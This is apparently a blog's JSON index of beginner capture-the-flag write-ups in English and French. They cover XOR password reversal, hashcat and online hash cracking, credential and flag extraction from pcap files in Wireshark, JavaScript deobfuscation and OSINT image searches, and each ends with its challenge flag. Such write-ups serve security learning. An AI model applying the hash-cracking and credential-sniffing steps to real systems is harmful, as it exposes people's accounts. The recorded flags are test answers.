Array.from(password).slice(0, 4) const block2 = Array.from(password).slice(4, 8) const block3 = Array.from(password).slice(8, 12) const block = [ block1, block2, block3 ] let crafted = \u0026#34;\u0026#34;; for (let i = 0; i \u0026lt; block.length; i++) { for (let a = 0; a \u0026lt; block[i].length; a++) { if (i == 0) { crafted += String.fromCharCode(String(block[i][a]).charCodeAt(0) ^ 7) } else if (i == 1) { crafted += String.fromCharCode(String(block[i][a]).charCodeAt(0) ^ 11) } else { crafted += String.fromCharCode(String(block[i][a]).charCodeAt(0) ^ 9) } } } if(crafted !== \u0026#34;sontTbxTjffe\u0026#34;) { throw new Error(\u0026#34;pass violation. wrong credentials\u0026#34;); } banner(password); } function banner(payload) { console.info(\u0026#34;that was great !!!\u0026#34;); console.info(\u0026#34;run the following command to get the flag.\u0026#34;) console.info(`curl -X POST \u0026lt;http://ctf.securityvalley.org:7777/api/v1/validate\u0026gt; -H \u0026#39;Content-Type: application/json\u0026#39; -d \u0026#39;{\u0026#34;pass\u0026#34;: \u0026#34;${payload}\u0026#34;}\u0026#39;`) } At the end,we can see that the \u0026ldquo;final pass\u0026rdquo; need to be sontTbxTjffe.The pass is in 3 part:\nsont ^ 7 TbxT ^ 11 jffe ^ 9 This is Xor (algo) so lets decode with cyberchef:\nsont = this TbxT = _is_ jffe = cool So the password is this_is_cool,so we need to replace the ${payload} with this_is_cool, so we enter: curl -X POST \u0026lt;http://ctf.securityvalley.org:7777/api/v1/validate\u0026gt; -H 'Content-Type: application/json' -d '{\u0026quot;pass\u0026quot;: \u0026quot;this_is_cool\u0026quot;}'\nThe flag appear ! The flag is: SecVal{9R34t_y0u_X0R3d}\n","permalink":"https://artyeth06.github.io/Good_authentication/","summary":"Writeup du challenge Good authentication","title":"Good authentication"},{"content":"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\nDescription: Ok ok ok. They have learned there lesson. Instead of using confusing authentication functions there have switched to crypto functions. At least they think they have switched to crypto functions. Anyway - please help us again and hack this piece of code!\nLevel: Level 2\nType: Coding ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\nSo what we have is a .py file:\nfrom hashlib import sha256 import sys def validate_password(password): # be creative. it has something to do with SecurityValley ;-) if sha256(password.encode(\u0026#34;utf-8\u0026#34;)).hexdigest() == \u0026#34;f51f333ed26c41bedd99e1e483c0a15d2caeed7dc5a9ae02159f196799a74893\u0026#34;: return True return False def print_banner(payload): print(\u0026#34;that was great !!!\u0026#34;) print(\u0026#34;run the following command to get the flag.\u0026#34;) print(\u0026#34;curl -X POST \u0026lt;http://ctf.securityvalley.org:7777/api/v1/validate\u0026gt; -H \u0026#39;Content-Type: application/json\u0026#39; -d \u0026#39;{\\\\\u0026#34;pass\\\\\u0026#34;: \\\\\u0026#34;\u0026#34;+payload+\u0026#34;\\\\\u0026#34;}\u0026#39;\u0026#34;) if __name__ == \u0026#34;__main__\u0026#34;: print(\u0026#34;let\u0026#39;s do more python ;-)\u0026#34;) password = input(\u0026#34;please enter password: \u0026#34;) if validate_password(password): print_banner(password) sys.exit() print(\u0026#34;wrong!\u0026#34;) We can see that their is a hash: f51f333ed26c41bedd99e1e483c0a15d2caeed7dc5a9ae02159f196799a74893, but it gives us nothing with hash cracker. They give us a hint: \u0026ldquo;be creative. it has something to do with SecurityValley ;-)\u0026quot;,so we can try to make a \u0026quot;wordlist\u0026quot; file with some varient of \u0026ldquo;SecurityValley\u0026rdquo; like this:\nsecurityValley SecurityValley securityvalley Securit1Valley secur1tyValley Securt1valley and use\nHashcat\nto crack the hash and get the password: by using this command:\nhashcat -a 0 -m 1470 f51f333ed26c41bedd99e1e483c0a15d2caeed7dc5a9ae02159f196799a74893 wordlist.txt -o --show to crack the ashes with some word of our\nwordlist.txt file,and we can see that the first one to come is\nSecur1tyValley :\nAnd then when we enter Secur1tyValley in the python script,it give us the command to run to get the flag:\nAnd when we run: `curl -X POST\nhttp://ctf.securityvalley.org:7777/api/v1/validate\n-H \u0026lsquo;Content-Type: application/json\u0026rsquo; -d \u0026lsquo;{\u0026ldquo;pass\u0026rdquo;: \u0026ldquo;Secur1tyValley\u0026rdquo;}\u0026rsquo; It gives us the flag !\nThe flag is: SecVal{To_51MPl3_foR_You}\n","permalink":"https://artyeth06.github.io/Hash_auth/","summary":"Writeup du challenge Hash auth","title":"Hash auth"},{"content":"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\nDescription: There is pcapng file. Can you, again, reveal the flag ?\nLevel: Level 1\nType: Network ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\nSo what we have is a .py file:\nSo, what we got is a\n.pcap file that we can open with\nWireshark\n, and this is what we have:\nWe can already see that we have a .png file,but we can\u0026rsquo;t \u0026ldquo;open it\u0026rdquo; in this menu,so lets go ahead to: file \u0026gt; export object \u0026gt; Http:\nAnd we can see that we have a file:\nflag.png :\nAnd when we click on it and\nporevisualisation , the flag appear:\nThe flag is: SecVal{g1mp_g1mp_g1mp} !\n","permalink":"https://artyeth06.github.io/The_data/","summary":"Writeup du challenge The data","title":"The data"},{"content":"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\nDescription: There is pcapng file. Can you reveal the authentication credentials?\nLevel: Level 1\nType: network ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\nSo the only thing we got is a\n.pcap file that we can open with\nWireshark\nWhen opening the file we can see the network snapshot:\nWe are looking for an authorization token,so we can see a\n200 Ok \u0026ldquo;header\u0026rdquo; wich means that everything is ok,so that the user is logged in,by taking a look at the line before, we can see that it is where the user log in\nAnd by taking a closer look,we can see in\nAuthorization \u0026gt; Credentials the flag !\nSo,the flag is: SecVal{845Ic4u7h_i5_5UP3R_5hI7}\n","permalink":"https://artyeth06.github.io/The_shark/","summary":"Writeup du challenge The shark","title":"The shark"},{"content":"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\nDescription: There is pcapng file. Can you reveal the authentication credentials?\nLevel: Level 1\nType: network ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\nSo,what we got is a\n.pcap file that we can open with\nWireshark\n,and this is what we have:\nWe are gonna take a closer look tor the\ntcp flux :\nWe can see that someone run a command: cat flag.txt and we can see the flag below the command ! The flag is: SecVal{rev_shell_fun_insec}\n","permalink":"https://artyeth06.github.io/The_shell/","summary":"Writeup du challenge The shell","title":"The shell"},{"content":"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\nDescription: I remember when I was traveling, I was able to visit many unique places in nature. But here I messed up my picture and I took the landscape to the left of my target. Can you identify what I was trying to photograph ? The flag is in english in the following form ; in lowercase and with _ instead of spaces : RM{flag}\nType: Osint\nLevel: Hard\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\nVoici le .png ssocié au challenge:\nUn coup sur google Lens:\nEt 1 nom en particulier attire mon attention,étant donné qu’il revient plusieurs fois: le Mont Rushmore, on peut donc essyer le flag: RM{mount_rushmore}, et le flag est accepté !\nLe flag est: RM{mount_rushmore}\n","permalink":"https://artyeth06.github.io/A_messed_up_picture_Geosint_4_sur_4/","summary":"Writeup du challenge A messed up picture - Geosint 4 sur 4 issu du CTF CTF Root-me 10k","title":"A messed up picture - Geosint 4 sur 4"},{"content":"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\nDescription: Where are you going?!\nType: Web\nLevel: Beginner ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\nCe challenge,quand nous cliquons sur le lien donné (http://ctf10k.root-me.org:9001) nous redirige directement et AUTOMATIQUEMENT vers un rick roll,ainsi nous ne pouvons voir le contenu de la page,une idée, est d\u0026rsquo;utiliser curl http://ctf10k.root-me.org:9001, afin ed voir le contenu de la page:\nAvec le curl, nous pouvons ainsi voir le contenu de la page,et ainsi le flag qui est:\nRM{I_st0pp3d_b3f0r3_b31ng_r1ckr0ll3d}\n","permalink":"https://artyeth06.github.io/Auto_travel/","summary":"Writeup du challenge Auto travel","title":"Auto travel"},{"content":"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\nDescription:What is that?\nType: Crypto\nLevel: Beginner ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\nEn téléchargant le fichier encrypt.enc, nous obtenons la suite de caractère suivantenAvec l\u0026rsquo;aide d\u0026rsquo;un simple outil (https://gchq.github.io/CyberChef/#recipe=Magic(3,false,false,\u0026rsquo;\u0026rsquo;)Magic(3,false,false,\u0026rsquo;\u0026rsquo;))nous permettant de détecter la technique d\u0026rsquo;encodage utilisé,nous pouvons obtenir les résultats suivants:\nNouvelle chaine de caractère: VWsxN1pETXpjRE55WDNSb05HNWZNM1l6Y2w5aU0yWXdjak45\n`` Nouvelle chaine de caractère:\nUk17ZDMzcDNyX3RoNG5fM3Yzcl9iM2YwcjN9 Puis nous en arrivons au flag ! Ainsi,le flag est: RM{d33p3r_th4n_3v3r_b3f0r3}\n","permalink":"https://artyeth06.github.io/Deep_inside/","summary":"Writeup du challenge Deep inside","title":"Deep inside"},{"content":"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\nDescription: My check is so secure!\nType: Web\nLevel: Beginner ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\nEn allant sur l\u0026rsquo;URL donnée,nous atterrissons sur une page,avec une alerte nous demandant le flag:\nRendons nous dans la console pour plus d\u0026rsquo;éléments:\nNous avons une très longue ligne que nous allons rendre plus visible grâce à https://beautifier.io/:\nSeul 3 lignes sont importantes:\nl = s.split(\u0026#34;\u0026#34;).reverse().join(\u0026#34;\u0026#34;); h.map(t =\u0026gt; String.fromCharCode(t)).join(\u0026#34;\u0026#34;) j.map(t =\u0026gt; String.fromCharCode(t)).join(\u0026#34;\u0026#34;) Nous allons pouvoir interpréter\nces résultats dans la console:\nNous avons ainsi le flag décomposé ! Il faut savoir que le l est reverse: l = s.split(\u0026quot;\u0026quot;).reverse().join(\u0026quot;\u0026quot;);,donc nous devons décoder son résultat à l\u0026rsquo;envers: 3s{MR ━━\u0026gt; RM{s3 Puis nous avons qu\u0026rsquo;à compléter avec les autres parties du flag: RM{s3 + cur1ty_thr0ugh_0b + scur1ty} ━━\u0026gt; RM{s3cur1ty_thr0ugh_0bscur1ty} Plus qu\u0026rsquo;à tester:\nLe flag est correct: RM{s3cur1ty_thr0ugh_0bscur1ty}\n","permalink":"https://artyeth06.github.io/Secured_front/","summary":"Writeup du challenge Secured front","title":"Secured front"},{"content":"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\nDescription: Can you find this picture location ? We\u0026rsquo;re looking for the name of the castle in lowercase and with _ instead of spaces. The flag is in english and in the form : RM{castle_flag}\nType: Osint\nLevel: Easy ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\nEn téléchargant le PNG,nous obtenons l\u0026rsquo;image d\u0026rsquo;un château:\nPour essayer de retrouver le nom de ce fichier,je fais une recherche image à l\u0026rsquo;aide de google Lens:\nNous avons le nom du château: Chateau Fort de Roquetaillade.\nAinsi le flag est: RM{castle_roquetaillade}\n","permalink":"https://artyeth06.github.io/Somewhere_in_France_Geosint_1_sur_4/","summary":"Writeup du challenge Somewhere in France Geosint 1 sur 4","title":"Somewhere in France Geosint 1 sur 4"},{"content":"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\nDescription: Your friend says he loves to \u0026rsquo;encrypt\u0026rsquo; his passwords. Fearing that you might crack it, he has decided not to tell you the hash function he used! Find his password to punish him for hiding his passwords from you!\nFormat: RM{the_password}\nType: Crypto\nLevel: Easy ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\nEn téléchargant le fichier encrypt.enc, nous obtenons la chaine de caractère suivante:621ec23e9e9bc5a442c280eb8ff66e0c6a6d571f69c155bbc53015e1195feaee9c918be1507554c8efff680446f32eebff74d0d907e0fc239da947849b049811 A l\u0026rsquo;aide d\u0026rsquo;outils simple et puissants, comme https://crackstation.net/, nous pouvons cracker le Hash\nNous obtenons ainsi le password: p@ssw0rd!\nAinsi le flag est: RM{p@ssw0rd!}\n","permalink":"https://artyeth06.github.io/To_crypt_or_not_to_crypt/","summary":"Writeup du challenge To crypt or not to crypt","title":"To crypt or not to crypt"},{"content":"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\nDescription: This magnificent landscape was used during the shooting of a scene from a famous movie. But do you know the title of this film? The flag is in english in the following form ; in lowercase and with _ instead of spaces : RM{flag}\nType: Osint\nLevel: Medium ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\nEN téléchargant l\u0026rsquo;image,nous obtenons une vue sur un canyon:\nCelui-ci est un peu plus complqué que [[Somewhere in France Geosint 1 sur 4]], étant donné que nous devons trouver un film tourné à cet endroit.Un petit coup sur google Lens,et nous savons comment se nomme cet endroit:\nPutangirua Pinnacles\n! Et en faisant une petite recherche (Putangirua Pinnacles films tournés), on peut trouver ce site:\nhttps://moviemaps.org/locations/138\n, qui nous indique les films tournés à cet endroit\nIl y a 2 résultats:\nThe Lord of the Rings: The Return of the King\nDead Alive Et en testant donc: RM{the_lords_of_the_rings_the_return_of_the_king}, le flag est accepté,ainsi le flag est: RM{the_lords_of_the_rings_the_return_of_the_king}\n","permalink":"https://artyeth06.github.io/Watch_some_movies_Geosint_2_sur_4/","summary":"Writeup du challenge To crypt or not to crypt","title":"Watch some movies , Geosint 2 sur 4"}]